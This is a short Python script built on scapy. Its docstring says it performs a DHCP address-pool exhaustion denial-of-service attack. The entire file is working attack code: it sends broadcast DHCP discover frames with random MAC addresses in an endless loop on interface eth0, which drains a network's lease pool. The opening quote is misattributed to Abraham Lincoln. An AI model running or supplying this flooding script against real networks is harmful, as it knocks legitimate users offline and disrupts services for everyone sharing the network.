#!/usr/bin/env python3.11
""" Best Way To Predict The Future, Is To Create It
	Abraham Lincoln

	This Module Is To Perform DHCP Exhaustion Addresses Pool (DOS)
	"""
from scapy.all import conf, sendp, RandMAC
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.l2 import Ether
import scapy

conf.checkIPaddr = False
dhcp_discover_message_frame = (
    Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC())
    / IP(src="0.0.0.0", dst="255.255.255.255")
    / UDP(sport=68, dport=67)
    / BOOTP(op=1, chaddr=RandMAC())
    / DHCP(options=[("message-type", "discover"), ("end",)])
)

sendp(dhcp_discover_message_frame, iface="eth0", loop=1, verbose=True)
